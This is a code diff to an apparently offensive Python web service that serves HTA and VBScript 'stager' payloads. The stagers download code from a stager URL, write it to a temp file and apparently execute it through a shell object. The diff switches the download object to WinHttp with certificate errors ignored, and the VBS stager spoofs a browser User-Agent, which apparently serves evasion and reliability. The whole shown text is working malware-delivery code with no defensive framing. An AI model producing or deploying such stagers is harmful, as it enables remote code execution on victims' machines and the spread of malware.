@@ -192,7 +192,8 @@ def serve_stager_hta(token: str, request: Request, db: Session = Depends(get_db)
 <script language="VBScript">
 Sub Window_OnLoad
   Dim h, fso, tmp, ts, sh
-  Set h   = CreateObject("MSXML2.XMLHTTP")
+  Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
+  h.Option(4) = 13056
   h.Open "GET", "{stager_url}", False
   h.Send
   Set fso = CreateObject("Scripting.FileSystemObject")
@@ -237,7 +238,8 @@ def serve_stager_vbs(token: str, request: Request, db: Session = Depends(get_db)
 
     vbs = f"""Dim oHttp, oFso, sTmp, oTs, oShell
 Randomize
-Set oHttp = CreateObject("MSXML2.XMLHTTP.6.0")
+Set oHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
+oHttp.Option(4) = 13056
 oHttp.Open "GET", "{stager_url}", False
 oHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
 oHttp.Send
